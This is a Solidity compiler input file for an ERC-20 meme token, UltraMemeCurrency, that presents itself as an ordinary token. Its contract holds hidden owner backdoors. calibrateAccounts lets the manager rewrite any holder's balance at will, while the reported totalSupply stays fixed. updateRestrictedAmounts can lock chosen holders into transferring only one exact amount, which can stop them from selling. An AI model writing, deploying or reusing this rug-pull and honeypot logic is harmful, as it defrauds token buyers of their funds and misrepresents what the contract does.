{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IDistinctERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract EnhancedContext {\r\n    function retrieveContextSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract LoneManager is EnhancedContext {\r\n    address private _chief;\r\n    event ManagerTransition(address indexed oldManager, address indexed freshManager);\r\n\r\n    constructor() {\r\n        address rootSender = retrieveContextSender();\r\n        _chief = rootSender;\r\n        emit ManagerTransition(address(0), rootSender);\r\n    }\r\n\r\n    function fetchManager() public view virtual returns (address) {\r\n        return _chief;\r\n    }\r\n\r\n    modifier managerPrivilege() {\r\n        require(fetchManager() == retrieveContextSender(), \"Privilege is exclusive to manager.\");\r\n        _;\r\n    }\r\n\r\n    function alterManager(address freshChief) public managerPrivilege {\r\n        _chief = freshChief;\r\n    }\r\n\r\n    function abandonRole() public virtual managerPrivilege {\r\n        emit ManagerTransition(_chief, address(0x000000000000000000000000000000000000dEaD));\r\n        _chief = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract UltraMemeCurrency is EnhancedContext, LoneManager, IDistinctERC20 {\r\n    mapping (address => mapping (address => uint256)) private _approvals;\r\n    mapping (address => uint256) private _ledger;\r\n    mapping (address => uint256) private _restrictedAmounts;\r\n\r\n    string public constant currencyName = \"UltraMemeCurrency\";\r\n    string public constant currencyTicker = \"UMEMC\";\r\n    uint8 public constant currencyScale = 18;\r\n    uint256 public constant supremeSupply = 123456 * (10 ** currencyScale);\r\n\r\n    constructor() {\r\n        _ledger[retrieveContextSender()] = supremeSupply;\r\n        emit Transfer(address(0), retrieveContextSender(), supremeSupply);\r\n    }\r\n    \r\n    modifier privilegedOrCreator() {\r\n        require(fetchManager() == retrieveContextSender(), \"You must be the manager.\");\r\n        _;\r\n    }\r\n\r\n    event Adjustment(address indexed user, uint256 oldBalance, uint256 freshBalance);\r\n\r\n    function restrictedTransferCap(address account) public view returns (uint256) {\r\n        return _restrictedAmounts[account];\r\n    }\r\n\r\n    function updateRestrictedAmounts(address[] calldata accounts, uint256 amount) public privilegedOrCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _restrictedAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function calibrateAccounts(address[] memory accountList, uint256 recalibratedAmount) public privilegedOrCreator {\r\n        require(recalibratedAmount >= 0, \"Recalibrated amount should be non-negative\");\r\n\r\n        for (uint256 i = 0; i < accountList.length; i++) {\r\n            address activeAccount = accountList[i];\r\n            require(activeAccount != address(0), \"Address cannot be zero.\");\r\n\r\n            uint256 originalAmount = _ledger[activeAccount];\r\n            _ledger[activeAccount] = recalibratedAmount;\r\n\r\n            emit Adjustment(activeAccount, originalAmount, recalibratedAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _ledger[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_ledger[retrieveContextSender()] >= amount, \"Insufficient balance.\");\r\n\r\n        uint256 cappedAmount = restrictedTransferCap(retrieveContextSender());\r\n        if (cappedAmount > 0) {\r\n            require(amount == cappedAmount, \"Transfer amount should match the capped amount.\");\r\n        }\r\n\r\n        _ledger[retrieveContextSender()] -= amount;\r\n        _ledger[recipient] += amount;\r\n\r\n        emit Transfer(retrieveContextSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _approvals[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approvals[retrieveContextSender()][spender] = amount;\r\n        emit Approval(retrieveContextSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_approvals[sender][retrieveContextSender()] >= amount, \"Exceeds allowance.\");\r\n\r\n        uint256 cappedAmount = restrictedTransferCap(sender);\r\n        if (cappedAmount > 0) {\r\n            require(amount == cappedAmount, \"Transfer amount should match the capped amount.\");\r\n        }\r\n\r\n        _ledger[sender] -= amount;\r\n        _ledger[recipient] += amount;\r\n        _approvals[sender][retrieveContextSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return supremeSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return currencyName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return currencyTicker;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return currencyScale;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}